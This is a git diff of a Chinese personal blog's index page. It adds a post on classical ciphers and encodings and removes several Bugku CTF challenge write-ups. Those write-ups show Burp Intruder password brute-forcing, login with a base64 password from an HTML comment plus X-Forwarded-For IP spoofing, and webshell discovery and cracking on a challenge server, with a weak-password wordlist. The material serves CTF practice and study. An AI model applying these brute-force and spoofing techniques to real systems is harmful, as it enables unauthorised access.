+<p>　　URI全称Uniform Resource Identifier(通用资源标识符)。Internet可用的每种资源 - HTML文档、图像、视频片段、程序等 -<br>　　由一个通过URI进行定位。 </p>
+<p>网页编码(Unicode)<br>　　论坛里常玩的一个把戏，就是让你回帖时写一堆像天书一样的奇怪字符，而回帖之后就能看到相应的文字。 </p>
+<p>　　密文(Unicode16进制)：楼主是个天才<br>　　密文(Unicode10进制)：楼主是个天才<br>　　明文：楼主是个天才 </p>
+<p>　　这里使用的是Unicode编码(十进制)，Unicode是一种全世界范围的文字编码，网页都支持这种编码。 </p>
+<p>Alt+数字小键盘<br>　　按住Alt键，在任意文本框中，用键盘右边的数字小键盘输入55021，然后松开Alt键，这时你看到了什么？ </p>
+<p>　　用同样的方法分别输入“你好”两个字的GB代码(十进制)50403、47811，这时你将在文本框中看到这两个字。 </p>
+<p>　　注意在qq的对话框中，要使用Unicode代码(十进制)20320、22909。<br>【元音密码】<br>元音密码的原则很简单，即将五个元音字母分别标号1，2，3，4，5，然后将26个英文字母的对应表码写成如下的形式：<br>a  b  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z1 11 12 13  2 21 22 23  3 31 32 33 34 35  4 41 42 43 44 45  5 51 52 53 54 55然后进行加密即可。</p>
+<p>题目：45.23.2.33.1.44.45.44.3.22.23.45<br>对应上表解出明文：the last sight（最后一面）.<br>需要说明的是，元音字母因为密文中只含有1，2，3，4，5五个数字而且时常出现个位数，因此很容易破解，<br>有时候可以将1，2，3，4，5变为10，20，30，40，50等，也可变成如同棋盘密码密文的形式来对解密者进行干扰。<br>【云影密码】<br>此密码运用了1248代码，因为本人才疏学浅，尚未发现有过使用的先例，因此暂归为原创密码，若有密码界前辈认为不妥，<br>请指出此密码或类似密码的普遍使用历史并附寄一份到我站内邮箱，我将以最快速度核查并改正。由于这个密码，我和片风云影初识，为了纪念，将其命名为“云影密码”，原文请见谜题大全精华区。<br>原理很简单，有了1，2，4，8这四个简单的数字，你可以以加法表示出0-9任何一个数字，例如0=28，7=124，9=18。<br>这样，再用1-26来表示A-Z，就可以用作密码了。<br>为了不至于混乱，我个人引入了第五个数字0，来用作间隔，以避免翻译错误，所以还可以称“01248密码”。</p>
+<p>题目：12401011801180212011401804<br>第一步，分割，即124  1  118  118  212  114  18  4<br>第二步，基本翻译，例如124可以表示7，也可以表示16（但不可能是34，因为不会超过26），所以可以放在一边，翻译其他没有异议的，<br>可得：124  a  s  s  w  o  18  d<br>第三步，推测得出明文。可以推测后面的18表示r，前面的为p最合适。</p>
+<p>明文：password（密码）.(五)四位乘法密码——（密文：I Q V L N J O P X；密钥：1234）<br>自古密文的传递者最担心的就是密文和密钥同时落入敌手，这样，密码的效应也就所剩无几了，<br>所以通常会将两样东西以不同的方式在不同的时间进行传送。但是，后来有一个叫前天淫次郎的日本鬼子发明了一种加密方式，<br>这种加密方式使得即使密钥落入敌手也不会轻易暴露，一时很令敌手头疼。<br>这种加密方式的关键是密钥，简短但是实用。下面介绍其使用及破译方法：<br>首先，任意选取一个个十百位数均无零的四位数，如题目中的密钥，即1234；<br>其次，将上述四位数做平方处理，即1234×1234=1522756,取中间三位数，即227；<br>再次，用所得数字与1234相乘，即227×1234=280118，取“中间三位”（之前传递和接收密文的双方要有所约定比如遇到像280118这样的数字，<br>是取‘801’还是取‘011’），这里取801；<br>依次类推，直到所得的三位数所含数字总个数大于或等于密文的字母个数为止，即801×1234=988434，取884。<br>这样，最终得到的一组码是227801884。<br>最后，将这组码标在密文下，向前推相应的位数即可得到明文，即</p>
+<p>密文：I Q V L N J O P X<br>密钥：2 2 7 8 0 1 8 8 4<br>明文：g o o d n i g h t(Good night!)<br><font color="red">【费娜姆密码】（密码：00110110010001001100100010000010110；密钥：study）</font></p>
+<p>二战时德军使用过的一种密码，其实是利用了二进制的表示法来替代字母，有如下的表格作为基础：</p>
+<p>A 1000001 B 1000010 C 1000011 D 1000100 E 1000101 F 1000110 G 1000111 H 1001000 I 1001001 J 1001010</p>
+<p>K 1001011 L 1001100 M 1001101 N 1001110 O 1001111 P 1010000 Q 1010001 R 1010010 S 1010011 T 1010100</p>
+<p>U 1010101 V 1010110 W 1010111 X 1011000 Y 1011001 Z 1011010</p>
+<p>那么，比如我们要加密“Hello”，密钥用“study”，则以如下方式进行加密：</p>
+<p>H E L L O = 1001000 1000101 1001100 1001100 1001111<br>S T U D Y = 1010011 1010100 1010101 1000100 1011001</p>
+<p>加密原则：1+1=0，0+0=0，1+0=1</p>
+<p>于是得密文：00110110010001001100100010000010110</p>
+<p>那么解题目中的密文，需要遵循以下几个原则和步骤，</p>
+<p>1，划分，即每七个数字为一组；</p>
+<p>2，对应，找出密文每个字母对应的数字，再与上述数字对应；</p>
+<p>3，转换，遵循上述加密原则，逆用即可；</p>
+<p>4，解密，得出新的一组数字，对应字母，得出明文。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/04/13编码/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-bk16-秋名山老司机" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -321,684 +1233,9 @@
 
 
   
-    <article id="post-bk14-输入密码查看flag" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/10/02/bk14-输入密码查看flag/">Bugku 2019/10/2 输入密码查看flag</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/10/02/bk14-输入密码查看flag/" class="archive-article-date">
-  	<time datetime="2019-10-01T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>意思是让你输入查看密码，而且提示了密码是5位数。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>甚至url里有着baopo的字眼，因此这道题可以使用bp的intruder暴力破解。</p>
-<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>利用字典生成器或者intruder的numbers payloads来爆破。<br>因为密码开头是1。不用跑全程就可以得到正确密码。<br>另外，注意positions设置只设置要爆破的字段。<br>最后得到密码位13579</p>
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
-<li>bp暴力破解</li>
-<li><strong>字典生成</strong></li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/10/02/bk14-输入密码查看flag/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bk13-web4" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/10/01/bk13-web4/">Bugku 2019/10/1 web4</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/10/01/bk13-web4/" class="archive-article-date">
-  	<time datetime="2019-09-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>有一段文字“看看源代码？”<br>一个输入框，一个写着提交的按钮。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>不用说也要看源代码。<br>看到form向index.php用post传递参数。<br>输入框的名字叫flag，应该是检验flag对错的。<br>输入1，看看反应。<br>说“再好好看看”。<br>根据之前的经验，就是检验flag对错。<br>html代码里有一段script。<br>是escape加密。</p>
-<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>eval里的代码看起来没有执行。我们直接输出，看看效果是什么。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;BKCTF-WEB4&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var p1 = &apos;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&apos;;</span><br><span class="line">var p2 = &apos;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&apos;;</span><br><span class="line">eval(document.write(unescape(p1) + unescape(&apos;%35%34%61%61%32&apos; + p2)));</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结果得到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123;if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure>
-
-<p>这是定义了一个checkSubmit的函数。<br>当a被赋值时，如果a的值是67d709b2b54aa2aa648cf6e87a7114f1时可能会发生一些事情，checkSubmit返回。<br>猜测a就是输入框里的东西。<br>输入以上字符串，返回结果即为flag。<br>很遗憾这个不是检验flag对错，而是用密文获取正确flag，思路里的猜想并不对。</p>
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
-<li><strong>eval()</strong></li>
-<li><strong>unescape</strong></li>
-<li><strong>JSP基础知识</strong></li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/10/01/bk13-web4/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bk12-管理员系统" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/09/30/bk12-管理员系统/">Bugku 2019/9/30 管理员系统</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/09/30/bk12-管理员系统/" class="archive-article-date">
-  	<time datetime="2019-09-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>可以看到一个管理员系统的登录页面，有Username、Password还有提交、重置按钮。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>一般来说管理员账号是admin、root、administrator等。<br>这里的密码看起来需要暴力破解，但其实不然，在源代码里可以发现一行被注释的玩意儿。<br>试着解密。【是base64加密】<br>然后登录。<br>登录后发现提示“IP禁止访问，请联系本地管理员登陆，IP已被记录. ”<br>意思就是本机IP不允许登录。<br>因此想到修改HTTP请求包，加入X-Forwarded-For头字段（大小写没有严格要求，但一般来说头字段里每个单词首字母大写）。</p>
-<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>html代码里获得：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- dGVzdDEyMw== --&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用base64解码得：“test123”。<br>猜测这是密码。然后尝试用户名为admin。<br>第一次尝试登录失败。<br>没有那么简单。<br>伪造真实IP为本地IP127.0.0.1。<br><img src="/img/bk12-1.png" alt="bk12-1"><br>登录成功。<br><img src="/img/bk12-2.png" alt="bk12-2"><br>回头我又试了一下root作为用户名。<br>返回结果为：<br><img src="/img/bk12-3.png" alt="bk12-3"><br>使用administrator和输错密码也是同样的结果。</p>
-<p>虽然做出来了，我们用BP找一下用户名。<br>用“去生日最小字典”（我个人感觉蛮实用的字典）暴力破解用户名。<br>实际上在intruder里就可以得到flag。<br><img src="/img/bk12-4.png" alt="bk12-4"></p>
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
-<li><strong>base64加密</strong></li>
-<li><strong>伪造真实IP</strong></li>
-<li>bp暴力破解</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/09/30/bk12-管理员系统/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-12正则表达式" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/09/29/12正则表达式/">正则表达式</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/09/29/12正则表达式/" class="archive-article-date">
-  	<time datetime="2019-09-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://www.cnblogs.com/zery/p/3438845.html" target="_blank" rel="noopener">参考网址</a><br>挑了部分来讲，全部写清还是有点困难。以实用为主。</p>
-<h1 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h1><p>正则表达式是一种特殊的字符串模式，用于匹配一组字符串，定义一种规则去匹配符合规则的字符。</p>
-<h1 id="常用的正则表达式工具"><a href="#常用的正则表达式工具" class="headerlink" title="常用的正则表达式工具"></a>常用的正则表达式工具</h1><p>可以使用<a href="https://pan.baidu.com/s/19Yn49" target="_blank" rel="noopener">McTracer</a></p>
-<h1 id="正则字符简介"><a href="#正则字符简介" class="headerlink" title="正则字符简介"></a>正则字符简介</h1><h2 id="元字符介绍"><a href="#元字符介绍" class="headerlink" title="元字符介绍"></a>元字符介绍</h2><p>^ 匹配行或字符串的起始位置<br>$ 匹配行或字符串的结尾<br>\b 不消耗字符、匹配一个位置（blank）<br>\d 匹配数字（digit）<br>\w 匹配字母、数字、下划线（word）<br>\s 匹配空格<br>. 匹配除了换行符的任意字符<br>[abc] 字符组，匹配括号内的所有字符<br>字母类的大写取反义，字符组加^取反义。</p>
-<h2 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h2><p>贪婪*：重复0次或更多<br>占有+：重复1次或更多<br>懒惰？：重复零次或一次<br>{n}：重复n次<br>{n，m}：重复n到m次<br>{n，}：重复n次或更多</p>
-<h2 id="懒惰限定符"><a href="#懒惰限定符" class="headerlink" title="懒惰限定符"></a>懒惰限定符</h2><p>尽可能少重复。</p>
-<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><h2 id="捕获分组"><a href="#捕获分组" class="headerlink" title="捕获分组"></a>捕获分组</h2><p>利用数字来对（）括号内的捕获内容进行分组。<br>加入?<name>可以对分组命名。<br>(?=exp)匹配exp前面的内容<br>(?&lt;=exp)匹配exp后面的内容</name></p>
-<h1 id="感觉还有不少内容没有涵盖进去，先这样吧-2019-9-29-20-33"><a href="#感觉还有不少内容没有涵盖进去，先这样吧-2019-9-29-20-33" class="headerlink" title="感觉还有不少内容没有涵盖进去，先这样吧 2019/9/29 20:33"></a>感觉还有不少内容没有涵盖进去，先这样吧 2019/9/29 20:33</h1>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/09/29/12正则表达式/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-JS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/09/29/JS/">JavaScript基础</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/09/29/JS/" class="archive-article-date">
-  	<time datetime="2019-09-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="JSP简介"><a href="#JSP简介" class="headerlink" title="JSP简介"></a>JSP简介</h1><p>JavaScript 是可插入HTML页面的编程代码。<br>它可以做到以下的事：</p>
-<ul>
-<li>直接写入html输出流（document.write）</li>
-<li>对事件的反应（通过button）</li>
-<li>改变html内容（利用getElementById找到唯一id对应的html元素，再用.innerHTML改变内容）</li>
-<li>改变html图像（通过element.src来改变图像的source）</li>
-<li>改变html样式</li>
-<li>验证输入</li>
-</ul>
-<h1 id="JSP用法"><a href="#JSP用法" class="headerlink" title="JSP用法"></a>JSP用法</h1><p>必须位于script标签之间。<br>既可放在body也可放在head里。<br>还可以将JavaScript保存在外部文件里。</p>
-<h1 id="JSP输出"><a href="#JSP输出" class="headerlink" title="JSP输出"></a>JSP输出</h1><ol>
-<li>window.alert()</li>
-<li>document.write()</li>
-<li>使用innerHTML写入html元素中。</li>
-<li>console.log写入浏览器的控制台中。</li>
-</ol>
-<h1 id="JSP语法"><a href="#JSP语法" class="headerlink" title="JSP语法"></a>JSP语法</h1><p>//是注释，也可以用/**/<br>语句用;作结<br>JSP对大小写敏感。<br>其它和别的编程语言差不多。</p>
-<h1 id="JSP语句"><a href="#JSP语句" class="headerlink" title="JSP语句"></a>JSP语句</h1><p>和C差不多</p>
-<h1 id="JSP变量"><a href="#JSP变量" class="headerlink" title="JSP变量"></a>JSP变量</h1><p>加var来声明。<br>是弱类型的。<br>可以声明多个变量。还可以跨行。<br>重新声明，值不会改变。</p>
-<h1 id="JSP数据类型"><a href="#JSP数据类型" class="headerlink" title="JSP数据类型"></a>JSP数据类型</h1><p>字符串、数字、布尔值、null、undefined、Symbol。<br>数据具有动态类型，可以通过赋值而改变数据类型。<br>JSP数组和C有一定区别。<br>JSP对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔。<br>可以用关键字new来声明变量类型。</p>
-<h1 id="JSP对象"><a href="#JSP对象" class="headerlink" title="JSP对象"></a>JSP对象</h1><p>对象是拥有属性和方法的数据。<br><img src="/img/js-1.png" alt="js-1"><br>在 JavaScript 中，对象是非常重要的，当你理解了对象，就可以了解 JavaScript 。<br>对象的方法定义了一个函数。</p>
-<h1 id="JSP函数"><a href="#JSP函数" class="headerlink" title="JSP函数"></a>JSP函数</h1><p>函数内的都是局部变量，函数内的都是局部变量，函数外的是全局变量。</p>
-<h1 id="JSP作用域"><a href="#JSP作用域" class="headerlink" title="JSP作用域"></a>JSP作用域</h1><p>作用域是可访问变量的集合。</p>
-<h1 id="JSP事件"><a href="#JSP事件" class="headerlink" title="JSP事件"></a>JSP事件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;some-HTML-element some-event=&quot;JavaScript 代码&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/js-2.png" alt="js-2"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">javascript</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/09/29/JS/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bk11-网站被黑" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/09/29/bk11-网站被黑/">Bugku 2019/9/29 网站被黑</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/09/29/bk11-网站被黑/" class="archive-article-date">
-  	<time datetime="2019-09-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>这道题的题目是网站被黑，但是这个题目“网站”并没有被黑，而你需要做的事就是侵入webshell。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>webshell是以php、asp等网页文件形式存在的命令执行环境，一开始不知道网页后台的网页文件有哪些。<br>因此使用web后台扫描工具扫出所有网页文件。然后寻找webshell，找到后，破解密码即可攻入。</p>
-<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>利用某御剑扫描工具，将域名“http://123.206.87.240:8002/webshell/”输入到软件中，点击开始扫描，等待片刻获得扫描结果。<br>然后发现“http://123.206.87.240:8002/webshell/shell.php”就是webshell。<br>然后利用bp破解密码。<br>方法是，首先在页面提交一次密码，然后在proxy里的history里找到发送过去的post包，将这个包发送给intruder，然后设置“破解字段”。<br>再在payloads里添加字典，然后start attack即可获取密码。<br>在弱字典里的最后部分里匹配到了密码，hack。<br>（字典附在后面）</p>
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
-<li><strong>黑入网站</strong></li>
-<li><strong>网站后台扫描</strong></li>
-<li><strong>bp暴力破解</strong></li>
-</ol>
-<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><p>computer<br>cpu<br>memory<br>disk<br>soft<br>y2k<br>software<br>cdrom<br>rom<br>admin<br>master<br>card<br>pci<br>lock<br>ascii<br>knight<br>creative<br>modem<br>internet<br>intranet<br>web<br>www<br>isp<br>unlock<br>ftp<br>telnet<br>ibm<br>intel<br>microsoft<br>dell<br>compaq<br>toshiba<br>acer<br>info<br>aol<br>56k<br>server<br>dos<br>windows<br>win95<br>win98<br>office<br>word<br>excel<br>access<br>unix<br>linux<br>password<br>file<br>program<br>mp3<br>mpeg<br>jpeg<br>gif<br>bmp<br>billgates<br>chip<br>silicon<br>sony<br>link<br>word97<br>office97<br>network<br>ram<br>sun<br>yahoo<br>excite<br>hotmail<br>yeah<br>sina<br>pcweek<br>mac<br>apple<br>robot<br>key<br>monitor<br>win2000<br>office2000<br>word2000<br>net<br>virus<br>company<br>tech<br>technology<br>print<br>coolweb<br>guest<br>printer<br>superman<br>hotpage<br>enter<br>myweb<br>download<br>cool<br>coolman<br>coolboy<br>coolgirl<br>netboy<br>netgirl<br>log<br>login<br>connect<br>email<br>hyperlink<br>url<br>hotweb<br>java<br>cgi<br>html<br>htm<br>home<br>homepage<br>icq<br>mykey<br>c++<br>basic<br>delphi<br>pascal<br>anonymous<br>crack<br>hack<br>hacker<br>chinese<br>vcd<br>chat<br>chatroom<br>mud<br>cracker<br>happy<br>hello<br>room<br>english<br>user<br>netizen<br>frontpage<br>agp<br>netwolf<br>usa<br>hot<br>site<br>address<br>mail<br>news<br>topcool<br>000<br>0000<br>001<br>002<br>007<br>008<br>10th<br>1st<br>2nd<br>3rd<br>4th<br>5th<br>6th<br>7th<br>8th<br>9th<br>100<br>101<br>108<br>133<br>163<br>166<br>188<br>233<br>266<br>350<br>366<br>450<br>466<br>136<br>137<br>138<br>139<br>158<br>168<br>169<br>192<br>198<br>200<br>222<br>233<br>234<br>258<br>288<br>300<br>301<br>333<br>345<br>388<br>400<br>433<br>456<br>458<br>500<br>555<br>558<b